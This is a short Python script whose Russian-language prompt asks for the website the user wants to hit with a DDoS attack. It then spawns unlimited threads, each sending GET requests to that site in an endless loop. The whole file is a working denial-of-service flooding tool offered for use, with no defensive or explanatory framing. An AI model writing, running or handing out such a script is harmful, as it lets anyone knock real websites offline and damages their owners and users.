import threading
import requests
link = input('Введите адрес сайта на который хотите совершить ddos атаку: ')
def dos():
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()